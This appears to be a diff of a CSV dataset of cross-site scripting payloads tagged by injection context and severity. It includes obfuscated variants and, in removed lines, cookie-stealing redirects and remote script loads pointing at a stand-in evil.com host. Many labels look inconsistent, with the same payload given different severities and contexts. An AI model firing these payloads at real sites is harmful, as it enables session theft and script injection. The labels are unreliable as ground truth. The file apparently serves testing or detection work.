@@ -1,489 +1,295 @@
 payload,context,severity
-<video src=x onerror=alert(1)>,event_handler,high
-""" onerror=\u0061\u006cert(1) x=""",attribute,medium
-"location=""javascript:alert(1)""",dom_sink,medium
-""" onload=alert(1) x=""",attribute,medium
-\x3cscript\x3ealert(document.domain)\x3c/script\x3e,script_injection,high
-<script>confirm(1)</script>,script_injection,high
-"document.body.innerHTML=""<img src=x onerror=confirm(1)>""",dom_sink,low
-"<object data=""javascript:alert(1)"">",attribute_escape,high
-"setTimeout(""alert(1)"",0)",dom_sink,medium
-<svg onload=alert()>,html_body,medium
-<video src=x onerror=confirm(1)>,event_handler,low
-<scRIPt>d.innErHTML+='';</sCRipt>,html_body,high
-"data:text/html,<script>alert(1)</script>",js_uri,medium
-"onerror=""alert(1)""",html_body,medium
-"<iframe src
-=""javascript:alert(	1)"">",script_injection,low
-#javascript:alert(document.cookie);,url,medium
-"javascript:void(document.location=""http://evil.com"")",js_uri,low
-<svg/src=x onerror=alert(1)//>,event_handler,low
-"<SCRIPT>document.location=""http://evil.com/?c=""+document.cookie</SCRIPT>",script_injection,high
-<video src=x onerror=alert(1)>,event_handler,medium
-"sEtTiMeOuT(""aLeRt(1)"",0)",event_handler,medium
-<svg/onload=confirm(1)>,template_injection,medium
-${alert(1)},template_injection,medium
-' onerror=alert(1) x=',attribute_escape,medium
-<%= confirm(1) %>,js_uri,medium
-"{{constructor.constructor(""al'+'ert(1)"")()}}",js_uri,low
-<marquee onstart=alert(1)>,event_handler,high
-"<iframe src=""javascript:confirm(1)"">",tag_injection,high
-<iframe/onload=alert(0);>,attribute,medium
-\' onerror=alert(1)//,attribute_escape,medium
-<details open ontoggle=alert(1)>,event_handler,low
-alert(document.cookie),attribute,medium
-\' onerror=alert(1)//,attribute_escape,low
-"<iframe src=""javascript:alert(1)"">",event_handler,medium
-"setTimeout(""alert(1)"",0)",attribute_escape,medium
-"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,low
-' onmouseover=alert(1) ',attribute,high
-"<embed src=""j\u0061v\u0061script:\u0061\u006cert(1)"">",script_injection,medium
-javascript:alert(1),js_uri,low
-"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",attribute_escape,medium
-&quot; onerror=confirm(1) x=&quot;,attribute_escape,high
-<marquee onstart=alert(1)>,attribute_escape,high
-"%3Ciframe src=""javascript:alert(1)""%3E",tag_injection,high
-"<video src
-=x onerror
-=alert(	1)>",tag_injection,medium
-"\""><img src=x onerror=alert(1)>",template_injection,high
-{{7*7}},event_handler,high
-"\""><img src=x onload=alert(1)>",attribute_escape,medium
-&quot; onerror=al'+'ert(1) x=&quot;,template_injection,medium
-"<embed src=""javascript:alert(1)"">",tag_injection,high
-<svg ONLoaD=ALeRt()>,attribute,medium
-javascript:confirm(1),js_uri,medium
-#{alert(1)},script_injection,medium
-javascript:alert(document.domain),js_uri,high
-javascript:alert(document.domain),attribute_escape,high
-"<object data=""javascript:alert(1)"">",tag_injection,medium
-<input onfocus=alert(1) autofocus>,event_handler,high
-<input onfocus=alert(1) autofocus>,event_handler,medium
-&quot; onerror=alert(1) x=&quot;,template_injection,low
-<img/src=x onload=alert(1)//>,event_handler,high
-onload='alert(1)',html_body,medium
-""" onload=alert(1) x=""",attribute,low
-' onmouseover=alert(1) ',attribute,high
-"setTimeout(""alert(1)"",0)",dom_sink,high
-<script>alert(document.domain)</script>,script_injection,high
-j\u0061v\u0061script:\u0061\u006cert(document.dom\u0061in),js_uri,low
-%3Cscript%3Econfirm(1)%3C/script%3E,tag_injection,high
-<ViDeO SrC=X OnErRoR=AlErT(1)>,template_injection,low
-<script>alert(1)</script>,script_injection,medium
-"javascr/**/ipt:void(document.location=""http://evil.com"")",js_uri,low
-' ><img src=x onerror=confirm(1)>,attribute,low
-javascript:confirm(1),js_uri,high
-""" onload=alert(1) x=""",attribute,high
-<img/src=x onerror=alert(1)//>,event_handler,low
-"<object data=""javascript:al'+'ert(1)"">",tag_injection,medium
-"\"" OnErRoR=AlErT(1)//",attribute_escape,high
-javascript:confirm(1),js_uri,low
-' onmouseover=alert(1) ',attribute,medium
-{{7*7}},script_injection,low
-"<embed src=""javascript:alert(1)"">",tag_injection,low
-""" onload=alert(1) x=""",attribute,medium
-<img src=x onerror=alert(1)>,event_handler,low
-"\""><img src=x onerror=alert(1)>",attribute_escape,high
-"sEtTiMeOuT(""aLeRt(1)"",0)",dom_sink,medium
-"location=""javascript:al'+'ert(1)""",dom_sink,high
-"\"" onerror=alert(1)//",attribute_escape,low
-"eval(""alert(1)"")",dom_sink,low
-javaSCRIPT:confirm(1),js_uri,high
-{{7*7}},template_injection,low
-' onerror=alert(1) x=',attribute,medium
-"eval(""alert(1)"")",dom_sink,high
-"<iframe src=""javascr/**/ipt:alert(1)"">",tag_injection,low
-""" onload=alert(1) x=""",attribute,medium
-\x3cscript\x3econfirm(1)\x3c/script\x3e,script_injection,high
-{{7*7}},template_injection,high
-\' onerror=alert(1)//,attribute_escape,high
-<script>prompt(1)</script>,script_injection,medium
-<marquee onstart=alert(1)>,event_handler,high
-<marquee onstart=alert(1)>,event_handler,high
-"<iframe src=""javascript:alert(1)"">",tag_injection,low
-"&quot; onerror
-=alert(	1) x
-=&quot;",script_injection,low
-javascript:alert(1),js_uri,low
-"\""><img src=x onerror=alert(1)>",attribute_escape,high
-<script>confirm(document.domain)</script>,script_injection,medium
-<svg/on\u006co\u0061d=\u0061\u006cert(1)>,attribute_escape,high
-"data:text/html,<script>alert(1)</script>",js_uri,high
-{{7*7}},template_injection,medium
-"<iframe src=""javaSCRIPT:alert(1)"">",tag_injection,medium
-<input onfocus=alert(1) autofocus>,attribute,low
-"<object data=""javascript:alert(1)"">",tag_injection,low
-"data:text/html,<script>alert(1)</script>",js_uri,medium
-""" onfocus=alert(1) autofocus=""",attribute,medium
-"<object data=""javascript:alert(1)"">",tag_injection,medium
-""" onload=alert(1) x=""",attribute,medium
+\' onload=alert(1)//,attribute,high
+\' onload=alert(1)//,event_handler,low
+\' onload=alert(1)//,dom_sink,medium
+\' onload=alert(1)//,attribute_escape,medium
+"""><img src=x onerror=alert(1)>",attribute,high
+"""><img src=x onerror=alert(1)>",attribute,high
 """><img src=x onerror=alert(1)>",attribute,medium
-""" onerror=alert(1) x=""",attribute,medium
-<%= alert(1) %>,event_handler,medium
-&quot; onload=alert(1) x=&quot;,attribute_escape,medium
-"onerror=""prompt`1`""",html_body,medium
-"<iframe src=""javascript:alert(1)"">",tag_injection,low
+"""><img src=x onerror=alert(1)>",attribute,medium
+"""><img src=x onerror=alert(1)>",attribute,medium
+"""><img src=x onerror=alert(1)>",template_injection,low
+"""><img src=x onerror=alert(1)>",attribute,high
+"""><img src=x onerror=alert(1)>",attribute,low
+"""><img src=x onerror=alert(1)>",js_uri,medium
+"""><img src=x onerror=alert(1)>",attribute,medium
+"""><img src=x onerror=alert(1)>",attribute,high
+"""><img src=x onerror=alert(1)>",attribute,low
+"""><img src=x onerror=alert(1)>",attribute,low
+"""><img src=x onerror=alert(1)>",attribute,low
+"""><img src=x onerror=alert(1)>",attribute,medium
+"""><img src=x onerror=alert(1)>",attribute,medium
+"""><img src=x onerror=alert(1)>",attribute,low
+"""><img src=x onerror=alert(1)>",attribute,medium
+"""><img src=x onerror=alert(1)>",attribute,medium
+"""><img src=x onerror=alert(1)>",attribute,medium
+"""><img src=x onerror=alert(1)>",attribute,high
+"""><img src=x onerror=alert(1)>",attribute,medium
+"""><img src=x onerror=alert(1)>",attribute,low
+"""><img src=x onerror=alert(1)>",attribute,high
+"""><img src=x onerror=alert(1)>",script_injection,high
+"""><img src=x onerror=alert(1)>",attribute,medium
+"data:text/html,<scr/**/ipt>alert(1)</scr/**/ipt>",js_uri,medium
+"data:text/html,<scr/**/ipt>alert(1)</scr/**/ipt>",tag_injection,high
+"data:text/html,<scr/**/ipt>alert(1)</scr/**/ipt>",js_uri,high
+"data:text/html,<scr/**/ipt>alert(1)</scr/**/ipt>",js_uri,medium
+"data:text/html,<scr/**/ipt>alert(1)</scr/**/ipt>",js_uri,high
+"\u006coc\u0061tion=""j\u0061v\u0061script:\u0061\u006cert(1)""",template_injection,low
+"\u006coc\u0061tion=""j\u0061v\u0061script:\u0061\u006cert(1)""",dom_sink,high
+"\u006coc\u0061tion=""j\u0061v\u0061script:\u0061\u006cert(1)""",dom_sink,high
+"\u006coc\u0061tion=""j\u0061v\u0061script:\u0061\u006cert(1)""",dom_sink,medium
+"\u006coc\u0061tion=""j\u0061v\u0061script:\u0061\u006cert(1)""",dom_sink,high
+"\u006coc\u0061tion=""j\u0061v\u0061script:\u0061\u006cert(1)""",script_injection,low
+<details open ontoggle=alert(1)>,event_handler,low
 <details open ontoggle=alert(1)>,event_handler,high
-""" onerror=alert(1) x=""",js_uri,low
-"<body>alert(String.fromCharCode(88,83,83))</script>",html_body,high
-\x3cscript src=//evil.com/xss.js\x3e\x3c/script\x3e,script_injection,low
-""" onfocus=alert(1) autofocus=""",attribute,high
+<details open ontoggle=alert(1)>,event_handler,low
+<details open ontoggle=alert(1)>,dom_sink,low
+<details open ontoggle=alert(1)>,event_handler,medium
+<details open ontoggle=alert(1)>,event_handler,high
+<details open ontoggle=alert(1)>,event_handler,low
+<details open ontoggle=alert(1)>,event_handler,medium
+<details open ontoggle=alert(1)>,event_handler,low
+<details open ontoggle=alert(1)>,event_handler,high
+<details open ontoggle=alert(1)>,js_uri,low
+<details open ontoggle=alert(1)>,event_handler,high
+<details open ontoggle=alert(1)>,event_handler,high
+<details open ontoggle=alert(1)>,event_handler,high
+<details open ontoggle=alert(1)>,template_injection,medium
+<details open ontoggle=alert(1)>,event_handler,medium
+<details open ontoggle=alert(1)>,event_handler,low
+<details open ontoggle=alert(1)>,js_uri,medium
+<details open ontoggle=alert(1)>,js_uri,medium
+<details open ontoggle=alert(1)>,event_handler,low
+<details open ontoggle=alert(1)>,event_handler,low
+<details open ontoggle=alert(1)>,event_handler,medium
+<details open ontoggle=alert(1)>,event_handler,medium
+<details open ontoggle=alert(1)>,event_handler,medium
+<details open ontoggle=alert(1)>,event_handler,high
+<details open ontoggle=alert(1)>,event_handler,high
+<details open ontoggle=alert(1)>,event_handler,low
+<details open ontoggle=alert(1)>,event_handler,high
+<details open ontoggle=alert(1)>,event_handler,low
+<details open ontoggle=alert(1)>,event_handler,high
+<details open ontoggle=alert(1)>,event_handler,high
+<details open ontoggle=alert(1)>,event_handler,medium
+<details open ontoggle=alert(1)>,attribute_escape,high
+<details open ontoggle=alert(1)>,event_handler,high
+<details open ontoggle=alert(1)>,event_handler,high
+<details open ontoggle=alert(1)>,event_handler,medium
+<details open ontoggle=alert(1)>,event_handler,medium
+<image src/onerror=alert(1)>,html_body,medium
+<image src/onerror=alert(1)>,html_body,medium
+<image src/onerror=alert(1)>,html_body,medium
+<image src/onerror=alert(1)>,html_body,medium
+<image src/onerror=alert(1)>,html_body,medium
+<image src/onerror=alert(1)>,html_body,medium
+<image src/onerror=alert(1)>,html_body,medium
+<image src/onerror=alert(1)>,html_body,medium
+<image src/onerror=alert(1)>,html_body,medium
+<image src/onerror=alert(1)>,html_body,medium
+"ontouchstart=""alert(1)""",html_body,medium
+<img/src=x onerror=confirm(1)//>,script_injection,low
+<img/src=x onerror=confirm(1)//>,event_handler,medium
+<img/src=x onerror=confirm(1)//>,event_handler,medium
+<img/src=x onerror=confirm(1)//>,attribute,medium
+<img/src=x onerror=confirm(1)//>,event_handler,medium
+<img/src=x onerror=confirm(1)//>,attribute_escape,medium
+<img/src=x onerror=confirm(1)//>,event_handler,medium
+<img/src=x onerror=confirm(1)//>,event_handler,low
+<img/src=x onerror=confirm(1)//>,script_injection,low
+<img/src=x onerror=confirm(1)//>,dom_sink,high
+"\""><img src=x onload=alert(1)>",attribute_escape,low
+"\""><img src=x onload=alert(1)>",attribute_escape,low
+"\""><img src=x onload=alert(1)>",attribute_escape,low
+"\""><img src=x onload=alert(1)>",script_injection,medium
+"\""><img src=x onload=alert(1)>",attribute_escape,medium
+"\""><img src=x onload=alert(1)>",attribute_escape,high
+"\""><img src=x onload=alert(1)>",attribute_escape,medium
+"\""><img src=x onload=alert(1)>",attribute_escape,low
+"\""><img src=x onload=alert(1)>",attribute_escape,high
+<video src=x onerror=confirm(1)>,event_handler,low
+<video src=x onerror=confirm(1)>,event_handler,high
+<video src=x onerror=confirm(1)>,event_handler,low
+"setTimeout(	""alert(	1)"",0)",dom_sink,low
+"setTimeout(	""alert(	1)"",0)",dom_sink,high
+<script>\u0061\u006cert(document.dom\u0061in)</script>,script_injection,low
 <script>\u0061\u006cert(document.dom\u0061in)</script>,script_injection,medium
-"""><%00script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
-{{7*7}},template_injection,low
-"eval(""alert(1)"")",dom_sink,medium
-onload='alert(1)',html_body,medium
-javascript:alert(1),js_uri,medium
-"location=""javascript:alert(1)""",dom_sink,low
-"onload=""alert(1)""",html_body,medium
-"data:text/html,<script>alert(	1)</script>",attribute_escape,low
-"#""><svg onload=alert(1)>",html_body,medium
-{{7*7}},script_injection,high
-#{alert(1)},script_injection,low
-"\""><img src=x onerror=alert(1)>",attribute_escape,medium
-"document.write(""<img src=x onerror=alert(1)>"")",dom_sink,low
-"<embed src=""javascript:confirm(1)"">",template_injection,high
-j\u0061v\u0061script:\u0061\u006cert(document.dom\u0061in),js_uri,high
-onsearch='alert(1)',attribute,medium
-javascript:alert(document.domain),js_uri,high
-"{{constructor.constructor(""alert(1)"")()}}",template_injection,low
-<video src=x onerror=alert(1)>,event_handler,medium
-<svg/on\u006co\u0061d=\u0061\u006cert(1)>,tag_injection,high
-javaSCRIPT:alert(document.domain),js_uri,low
-<script>alert(document.domain)</script>,script_injection,low
-"location=""javascript:confirm(1)""",dom_sink,high
-<script>confirm(1)</script>,script_injection,medium
-' onmouseover=alert(1) ',attribute,high
-"setTimeout(""alert(1)"",0)",dom_sink,high
+<svg/onload=confirm(1)>,tag_injection,high
+<svg/onload=confirm(1)>,tag_injection,high
+<svg/onload=confirm(1)>,tag_injection,medium
+<svg/onload=confirm(1)>,attribute_escape,high
+<svg/onload=confirm(1)>,js_uri,high
+<svg/onload=confirm(1)>,template_injection,medium
+<svg/onload=confirm(1)>,js_uri,high
+<svg/onload=confirm(1)>,tag_injection,high
+<svg/onload=confirm(1)>,tag_injection,medium
+<svg/onload=confirm(1)>,attribute,high
+\x3cscript\x3ealert(1)\x3c/script\x3e,template_injection,low
+\x3cscript\x3ealert(1)\x3c/script\x3e,script_injection,medium
+\x3cscript\x3ealert(1)\x3c/script\x3e,script_injection,high
+\x3cscript\x3ealert(1)\x3c/script\x3e,script_injection,high
+"{{constructor.constructor(""confirm(1)"")()}}",template_injection,medium
+"{{constructor.constructor(""confirm(1)"")()}}",template_injection,high
+"{{constructor.constructor(""confirm(1)"")()}}",script_injection,medium
+"{{constructor.constructor(""confirm(1)"")()}}",attribute_escape,low
+"{{constructor.constructor(""confirm(1)"")()}}",dom_sink,high
+"{{constructor.constructor(""confirm(1)"")()}}",template_injection,high
+"{{constructor.constructor(""confirm(1)"")()}}",dom_sink,high
+"{{constructor.constructor(""confirm(1)"")()}}",template_injection,medium
+"{{constructor.constructor(""confirm(1)"")()}}",event_handler,high
+"onerror=""alert(1)""",html_body,medium
+"onerror=""alert(1)""",html_body,medium
+"onerror=""alert(1)""",html_body,medium
+"onerror=""alert(1)""",html_body,medium
+"onerror=""alert(1)""",html_body,medium
+"onerror=""alert(1)""",html_body,medium
+"onerror=""alert(1)""",html_body,medium
+"onerror=""alert(1)""",html_body,medium
+"onerror=""alert(1)""",html_body,medium
+"onerror=""alert(1)""",html_body,medium
+javascript:alert(	document.domain),js_uri,high
+javascript:alert(	document.domain),dom_sink,high
+javascript:alert(	document.domain),js_uri,low
+javascript:alert(	document.domain),js_uri,low
+javascript:alert(	document.domain),js_uri,low
+javascript:alert(	document.domain),js_uri,medium
+javascript:alert(	document.domain),js_uri,medium
+"\"" onerror
+=alert(	1)//",attribute,low
+"\"" onerror
+=alert(	1)//",attribute_escape,low
+"\"" onerror
+=alert(	1)//",attribute_escape,medium
+"dOcUmEnT.WrItE(""<ImG SrC=X OnErRoR=AlErT(1)>"")",dom_sink,medium
+"<script
+>d.innerHTML+='';</script>//[""'`-->]]>]</div>",attribute,high
+<%= aLeRt(1) %>,template_injection,medium
+<%= aLeRt(1) %>,template_injection,medium
+<%= aLeRt(1) %>,template_injection,high
+<%= aLeRt(1) %>,script_injection,high
+<%= aLeRt(1) %>,script_injection,low
+"%3Ciframe src=""javascript:alert(1)""%3E",tag_injection,medium
+"%3Ciframe src=""javascript:alert(1)""%3E",event_handler,low
+"%3Ciframe src=""javascript:alert(1)""%3E",tag_injection,high
+<marquee onstart=al'+'ert(1)>,event_handler,medium
+"<object d\u0061t\u0061=""j\u0061v\u0061script:\u0061\u006cert(1)"">",tag_injection,medium
+"<object d\u0061t\u0061=""j\u0061v\u0061script:\u0061\u006cert(1)"">",tag_injection,medium
+"<object d\u0061t\u0061=""j\u0061v\u0061script:\u0061\u006cert(1)"">",tag_injection,high
+"<object d\u0061t\u0061=""j\u0061v\u0061script:\u0061\u006cert(1)"">",tag_injection,low
+"<object d\u0061t\u0061=""j\u0061v\u0061script:\u0061\u006cert(1)"">",tag_injection,low
+&lt;%= alert(1) %&gt;,template_injection,high
+&lt;%= alert(1) %&gt;,dom_sink,medium
+&lt;%= alert(1) %&gt;,script_injection,low
+${\u0061\u006cert(1)},attribute_escape,medium
+${\u0061\u006cert(1)},template_injection,low
+${\u0061\u006cert(1)},template_injection,high
+${\u0061\u006cert(1)},event_handler,high
+"location
+=""javascript:alert(	1)""",dom_sink,low
+"location
+=""javascript:alert(	1)""",dom_sink,low
 "location
 =""javascript:alert(	1)""",dom_sink,medium
-\' onerror=alert(1)//,attribute_escape,high
-onload='alert`1`',attribute,medium
-{{7*7}},template_injection,medium
-""" onfocus=alert(1) autofocus=""",attribute,medium
-"javascript:void(document.location=""http://evil.com"")",js_uri,low
-onload='alert(document.domain)',attribute,medium
-<script>alert(document.domain)</script>,js_uri,high
-"javascript:void(document.location=""http://evil.com"")",js_uri,high
-"document.body.innerHTML=""\x3cimg src=x onerror=alert(1)\x3e""",js_uri,medium
-${alert(1)},js_uri,high
-{{7*7}},template_injection,high
-javascript:alert(1),js_uri,low
-&lt;%= alert(1) %&gt;,script_injection,low
-javascript:confirm(1),js_uri,low
-' onerror=alert(1) x=',attribute,medium
-""" onfocus=alert(1) autofocus=""",attribute,high
-<script>alert(document.domain)</script>,script_injection,medium
-<img src=x onerror=alert(1)>,tag_injection,medium
-<video onload=alert()>,html_body,medium
-"<iframe src=""javascript:confirm(1)"">",tag_injection,medium
-<svg on\u006co\u0061d=\u0061\u006cert(1)>,event_handler,medium
-<img src=x onerror=alert(1)>,tag_injection,low
-""" onload=alert(1) x=""",attribute_escape,high
-{{7*7}},template_injection,high
-<input onfocus=\u0061\u006cert(1) \u0061utofocus>,event_handler,high
-' onmouseover=alert(1) ',dom_sink,high
-"%3Cscript%3Edocument.location=""http://evil.com/?c=""+document.cookie%3C/script%3E",script_injection,low
-&quot; onerror=alert(1) x=&quot;,attribute_escape,medium
-' %3E%3Cimg src=x onerror=alert(1)%3E,tag_injection,medium
-onload='alert(1)',attribute,medium
-<SCRIPT>alert(1)</SCRIPT>,script_injection,medium
-javascript:al'+'ert(1),js_uri,medium
-<svg/onload=alert(1)>,tag_injection,low
-<svg/on\u006co\u0061d=\u0061\u006cert(1)>,tag_injection,low
-<svg/onload=al'+'ert(1)>,tag_injection,low
-""" onfocus=alert(1) autofocus=""",attribute,high
-<iframe/onload=alert(0);>,html_body,medium
-&quot; onerror=alert(1) x=&quot;,event_handler,high
-"<object data=""javascript:confirm(1)"">",tag_injection,low
-"ev\u0061\u006c(""\u0061\u006cert(1)"")",dom_sink,high
-"<iframe src=""javascript:alert(1)"">",tag_injection,medium
-\' onload=alert(1)//,attribute_escape,medium
-<img/src=x onerror=\u0061\u006cert(1)//>,event_handler,medium
-"<details open ontoggle
-=alert(	1)>",event_handler,low
-<input onfocus=alert(1) autofocus>,event_handler,high
-<img src=x onerror=alert(1)>,tag_injection,high
-""" onfocus=alert(1) autofocus=""",dom_sink,medium
-"\"" onerror=\u0061\u006cert(1)//",attribute_escape,low
-<iframe/onload=alert(0);>,html_body,medium
-&quot; onerror=alert(1) x=&quot;,attribute_escape,low
-javascript:alert(1),attribute_escape,medium
-"<iframe src=""javascript:alert(1)"">",tag_injection,high
-"\"" onerror=alert(1)//",js_uri,medium
-<image src/onerror=alert(1)>,html_body,medium
-<img src=x onerror=alert(1)>,tag_injection,high
 "<embed src=""javascript:confirm(1)"">",tag_injection,high
-<svg/onload=alert(1)>,tag_injection,high
-"<iframe src
-=""javascript:alert(	1)"">",tag_injection,medium
-""" onfocus=alert(1) autofocus=""",attribute,medium
-""" onload=alert(1) x=""",attribute,high
-\x3cscript\x3eprompt(1)\x3c/script\x3e,script_injection,high
-<svg src=x onerror=alert(1)>,tag_injection,high
-<svg/onload=confirm(1)>,js_uri,high
-"javascript:void(document.location=""http://evil.com"")",js_uri,medium
-<body onload=al'+'ert(1)>,event_handler,medium
-${alert(1)},template_injection,low
-"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",js_uri,high
-' onerror=alert(1) x=',attribute,high
-OnloAD='aLeRT(1)',html_body,medium
-"document.write(""<img src=x onerror=alert(1)>"")",tag_injection,high
-<svg/onload=alert(1)>,tag_injection,medium
-"<ifr\u0061me src=""j\u0061v\u0061script:\u0061\u006cert(1)"">",tag_injection,high
-<details open ontoggle=alert(1)>,event_handler,high
-javascript:confirm(	1),attribute,low
-<marquee onstart=alert(1)>,attribute,medium
-&lt;script&gt;alert(document.domain)&lt;/script&gt;,script_injection,low
-"\"" OnErRoR=AlErT(1)//",attribute_escape,low
-<svg/onload=alert(1)>,tag_injection,high
-jaVascrIPT:cONfirM(1)//,url,medium
-\x3cimg src=x onerror=alert(1)\x3e,event_handler,low
-"<object data=""javascript:alert(1)"">",tag_injection,low
-javascript:confirm(1),js_uri,medium
-<script>prompt(1)</script>,script_injection,high
-"\""><img src=x onerror=confirm(1)>",attribute_escape,low
-"<object data=""javascript:alert(1)"">",tag_injection,low
-<img src=x onerror=confirm(1)>,tag_injection,low
-<ScRiPt>pRoMpT(1)</ScRiPt>,script_injection,low
-\' onerror=alert(1)//,attribute_escape,medium
-%3Cscript%3Ealert(1)%3C/script%3E,script_injection,low
-""">< script>alert(String.fromCharCode(88,83,83))</script>",html_body,high
-"onerror=""top.alert(1)""",html_body,medium
-""" onload=alert(1) x=""",attribute,high
-"#""><svg onload=alert(1)>",attribute,medium
-<ScRiPt>aLeRt(1)</sCrIpT>,script_injection,high
-"eval(""alert(1)"")",dom_sink,high
-</tag><svg onload=alert(1)>,html_body,medium
-<marquee onstart=alert(1)>,template_injection,low
-javascript:confirm(1),dom_sink,low
-#{alert(1)},script_injection,high
-""" onfocus=alert(1) autofocus=""",attribute,high
-"<EmBeD SrC=""jAvAsCrIpT:AlErT(1)"">",tag_injection,medium
-"data:text/html,<script>alert(1)</script>",js_uri,low
-<svg onload=alert(1)>,event_handler,high
-""" onload=alert(1) x=""",attribute,low
-"document.write(""<img src=x onerror=alert(1)>"")",js_uri,high
-"<svg/onload
-=alert(	1)>",tag_injection,low
-<SCRIPT>alert(1)</SCRIPT>,script_injection,low
-"""><img src=x onerror=alert(1)>",attribute,medium
-""" oNlOaD=AlErT(1) x=""",attribute,low
-\' OnErRoR=AlErT(1)//,attribute_escape,medium
-<input onfocus=alert(1) autofocus>,js_uri,high
-<marquee onstart=alert(1)>,script_injection,high
-<img/src=x onerror=confirm(1)//>,script_injection,low
-"""><img src=x onerror=alert(1)>",attribute,high
-j\u0061v\u0061script:confirm(1),js_uri,high
-\u003e\u003cimg src=1 oncut=alert(0)\u003e,attribute,medium
-""" onfocus=alert(1) autofocus=""",attribute,low
-javascript:alert(1),js_uri,high
-onerror=alert(0);>,html_body,medium
-"\"" OnErRoR=AlErT(1)//",attribute_escape,low
-' onmouseover=alert(1) ',event_handler,high
-<script>prompt(1)</script>,script_injection,low
-"setTimeout(""alert(1)"",0)",dom_sink,high
-"<%00vIdeO><sourCe onerror=""['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])"">",html_body,high
-javascript:confirm(1),template_injection,low
-""" onload=alert(1) x=""",attribute,medium
-<svg onload=alert()>,html_body,medium
-"<embed src=""javaSCRIPT:alert(1)"">",tag_injection,high
-"' ><img src
-=x onerror
-=alert(	1)>",attribute,high
-&lt;img/src=x onerror=alert(1)//&gt;,event_handler,low
-%3Cscript src=//evil.com/xss.js%3E%3C/script%3E,script_injection,low
-"j\u0061v\u0061script:void(document.\u006coc\u0061tion=""http://evi\u006c.com"")",attribute,medium
-"javascript:void(document.location=""http://evil.com"")",js_uri,low
-<script>alert(document.domain)</script>,script_injection,high
-"{{constructor.constructor(""alert(1)"")()}}",template_injection,high
-${alert(1)},attribute,high
-"eval(""alert(1)"")",dom_sink,high
-' onmouseover=al'+'ert(1) ',attribute,high
-"eval(""alert(1)"")",dom_sink,high
-<svg onload=alert(1)>,event_handler,low
-"""><img src=x onerror=alert(1)>",attribute,medium
-confirm(1))</SCRIPT>,html_body,high
-#{confirm(1)},template_injection,high
-""" onload=alert(1) x=""",attribute,high
-<script src=//evil.com/xss.js></script>,script_injection,low
-"{{constructor.constructor(""alert(1)"")()}}",tag_injection,low
-<script>alert(1)</script>,script_injection,medium
-\' onerror=alert(1)//,js_uri,high
-"document.body.innerHTML=""<img src=x onerror=alert(1)>""",dom_sink,medium
-&quot; onerror=confirm(1) x=&quot;,attribute_escape,low
-<script src=//evil.com/xss.js></script>,script_injection,low
-&quot; onerror=al'+'ert(1) x=&quot;,attribute_escape,low
-#{alert(1)},template_injection,medium
-<input onfocus=alert(1) autofocus>,event_handler,medium
-<script>alert(	1)</script>,script_injection,low
-<svg/onload=alert(1)>,tag_injection,medium
-javascript:confirm(1),js_uri,low
-"<object data=""javascript:alert(1)"">",script_injection,medium
-<svg onload=alert()>,html_body,medium
-<marquee onstart=alert(1)>,event_handler,medium
-<svg/onload=alert(1)>,tag_injection,low
-"document.write(""<img src=x onerror=confirm(1)>"")",tag_injection,high
-"eval(""alert(1)"")",dom_sink,high
-<marquee onstart=confirm(1)>,event_handler,low
-&lt;marquee onstart=alert(1)&gt;,dom_sink,high
-"javascript:void(document.location=""http://evil.com"")",js_uri,high
-#{alert(1)},template_injection,medium
-javascript:alert(1),js_uri,low
-"document.body.innerHTML=""<img src=x onerror=alert(1)>""",script_injection,medium
-#{alert(1)},js_uri,medium
-"document.write(""<img src=x onerror=confirm(1)>"")",dom_sink,low
-"\x3cembed src=""javascript:alert(1)""\x3e",tag_injection,medium
-' ><svg src=x onerror=alert(1)>,event_handler,medium
-<script>alert(document.domain)</script>,script_injection,high
-\' onerror=confirm(1)//,attribute_escape,low
-"document.body.innerHTML=""<img src=x onload=alert(1)>""",dom_sink,high
-""" onfocus=al'+'ert(1) autofocus=""",attribute,medium
-&quot; onerror=alert(1) x=&quot;,attribute_escape,medium
-"%3Cobject data=""javascript:alert(1)""%3E",tag_injection,high
-"<embed src=""javascr/**/ipt:alert(1)"">",tag_injection,low
-{{7*7}},template_injection,low
-<scr/**/ipt>prompt(1)</scr/**/ipt>,script_injection,low
-<video src=x onerror=alert(1)>,event_handler,low
-"data:text/html,<script>confirm(1)</script>",js_uri,high
-javascr/**/ipt:alert(document.domain),js_uri,medium
-<script>alert(1)</script>,script_injection,medium
-<img src=x onerror=alert(1)>,tag_injection,low
-<iframe/onload=alert(0);>,html_body,medium
-<svg on\u006co\u0061d=\u0061\u006cert(1)>,event_handler,medium
-' ><img src=x onerror=alert(1)>,attribute,low
-javascr/**/ipt:confirm(1),js_uri,low
-"javascript:void(document.location=""http://evil.com"")",tag_injection,low
-\x3cimg src=x onerror=alert(1)\x3e,tag_injection,medium
-"data:text/html,<script>alert(1)</script>",template_injection,low
-top.alert(1))</SCRIPT>,html_body,high
-""" onload=alert(1) x=""",script_injection,medium
-"{{constructor.constructor(""alert(1)"")()}}",template_injection,low
-\x3cSCRIPT\x3ealert(1)\x3c/SCRIPT\x3e,script_injection,high
-"{{constructor.constructor(""alert(1)"")()}}",template_injection,low
-"location=""javascript:alert(1)""",dom_sink,medium
-"setTimeout(""alert(1)"",0)",attribute,high
-<SCRIPT src=//evil.com/xss.js></SCRIPT>,script_injection,low
-#{alert(1)},template_injection,low
-""" onfocus=alert(1) autofocus=""",attribute,medium
-"<img src
-=x onerror
-=alert(	1)>",event_handler,low
-<input onfocus=alert(1) autofocus>,event_handler,low
-{{7*7}},template_injection,high
-<marquee onstart=alert(1)>,tag_injection,high
-' onerror=alert(1) x=',attribute_escape,medium
-<img src=x onerror=alert(1)>,dom_sink,high
-' onerror=alert(1) x=',tag_injection,high
-"eval(""alert(1)"")",attribute,low
-<SCRIPT>al'+'ert(1)</SCRIPT>,script_injection,low
-innerHTML=location.hash>#<meter>alert(1)</script>,html_body,high
-%3Cimg/src=%3Dx+onpointerover=alert(2)%3D,attribute,medium
-""" onload=alert(1) x=""",attribute,medium
-javascript:alert(document.domain),js_uri,medium
-"<object data=""javascript:alert(1)"">",template_injection,high
-#{alert(1)},template_injection,low
-<image src/onerror=alert(1)>,html_body,medium
-<svg/on\u006co\u0061d=\u0061\u006cert(1)>,attribute,high
-"<object data=""javascript:alert(1)"">",tag_injection,medium
-"onerror=""alert(document.cookie)""",html_body,medium
-javascript:alert(	document.domain),js_uri,medium
